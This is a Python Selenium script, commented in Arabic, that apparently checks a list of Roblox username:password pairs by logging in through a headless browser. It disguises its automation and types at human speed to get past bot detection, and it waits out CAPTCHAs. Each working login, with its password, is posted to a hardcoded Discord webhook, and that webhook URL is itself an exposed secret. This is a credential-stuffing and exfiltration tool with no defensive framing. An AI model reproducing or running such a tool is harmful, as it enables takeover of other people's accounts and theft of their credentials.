import time
import sys
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import requests
import random

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
ACCOUNTS_FILE = "accounts.txt"
# -----------------------

def print_now(text):
    print(text)
    sys.stdout.flush()

def check_login_stealth(username, password):
    """يفتح متصفح مخفي ويجرب الدخول كإنسان"""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    driver = None
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        driver.get("https://www.roblox.com/login")
        time.sleep(random.uniform(3, 5))

        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME, "username")))
        
        # كتابة البيانات ببطء كإنسان
        user_field = driver.find_element(By.NAME, "username")
        for char in username:
            user_field.send_keys(char)
            time.sleep(random.uniform(0.1, 0.2))
            
        pass_field = driver.find_element(By.NAME, "password")
        for char in password:
            pass_field.send_keys(char)
            time.sleep(random.uniform(0.1, 0.2))
            
        time.sleep(1)
        driver.find_element(By.ID, "login-button").click()

        time.sleep(10) # انتظار النتيجة

        if "home.roblox.com" in driver.current_url or "users.roblox.com" in driver.current_url:
            return "SUCCESS"
        elif "captcha" in driver.page_source.lower():
            return "CAPTCHA"
        else:
            return "FAILED"
            
    except Exception as e:
        return f"ERROR: {e}"
    finally:
        if driver: driver.quit()

def main():
    print_now("🔥 بدء فاحص القائمة (List Checker) على Render...")
    
    if not os.path.exists(ACCOUNTS_FILE):
        print_now(f"❌ خطأ: ملف {ACCOUNTS_FILE} غير موجود! يرجى إنشاؤه في GitHub.")
        return

    with open(ACCOUNTS_FILE, "r") as f:
        accounts = f.readlines()

    print_now(f"📋 تم تحميل {len(accounts)} حساب للفحص.")

    for line in accounts:
        line = line.strip()
        if ":" not in line: continue
        
        username, password = line.split(":", 1)
        print_now(f"🔍 جاري فحص الحساب: {username}...")
        
        status = check_login_stealth(username, password)
        
        if status == "SUCCESS":
            print_now(f"✅✅ شغال!! تم الإرسال لديسكورد: {username}")
            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔥 **حساب شغال من القائمة!**\n`{username}:{password}`"})
        elif status == "CAPTCHA":
            wait = random.randint(120, 180)
            print_now(f"⚠️ ظهرت كابتشا.. سأنتظر {wait} ثانية.")
            time.sleep(wait)
        else:
            print_now(f"❌ فشل الدخول للحساب: {username} ({status})")
        
        time.sleep(random.randint(15, 30)) # انتظار بين كل حساب وآخر

    print_now("🏁 انتهى فحص جميع الحسابات في القائمة.")

if __name__ == "__main__":
    main()
